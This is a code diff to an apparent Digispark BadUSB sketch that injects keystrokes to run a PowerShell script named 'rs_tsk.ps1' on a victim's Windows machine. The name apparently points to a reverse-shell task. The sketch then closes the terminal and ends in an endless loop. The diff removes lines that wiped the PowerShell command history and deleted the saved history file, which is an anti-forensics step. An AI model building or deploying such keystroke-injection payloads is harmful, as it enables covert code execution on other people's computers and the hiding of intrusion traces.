@@ -46,18 +46,9 @@ void loop(){
   
   DigiKeyboard.print("C:\\rs_tsk.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(500);
-  //Delete all powershell command line history in current session and delete session.
-  DigiKeyboard.print("[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("Clear-History");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.print("Remove-Item (Get-PSReadlineOption).HistorySavePath");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  //Exit Terminal
   DigiKeyboard.print("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);
+  
   while(1){
   }
 }
